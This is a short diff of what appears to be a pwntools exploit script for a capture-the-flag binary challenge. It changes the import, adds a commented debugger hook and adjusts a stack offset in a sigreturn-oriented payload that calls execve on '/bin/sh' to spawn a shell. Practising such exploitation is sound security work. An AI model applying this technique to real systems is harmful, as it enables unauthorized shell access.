@@ -1,4 +1,4 @@
-from pwn import *
+from kk import *
 
 context(log_level = 'debug')
 context(os="linux", arch="amd64")
@@ -23,6 +23,7 @@ p.send(pld1)
 stack_addr = u64(p.recvuntil(b'\x7f')[-6:]+b'\x00'*2)
 p.success("stack_addr: {}".format(hex(stack_addr)))
 
+#GDB(p)
 # second time
 pld2 = b'/bin/sh\x00'
 pld2 = pld2.ljust(0x10, b'a')
@@ -31,7 +32,7 @@ pld2 += p64(syscall_ret)
 
 sigframe = SigreturnFrame()
 sigframe.rax = constants.SYS_execve
-sigframe.rdi = stack_addr - 0x118
+sigframe.rdi = stack_addr - 0x140                  #0x118
 sigframe.rsi = 0
 sigframe.rdx = 0
 sigframe.rsp = stack_addr
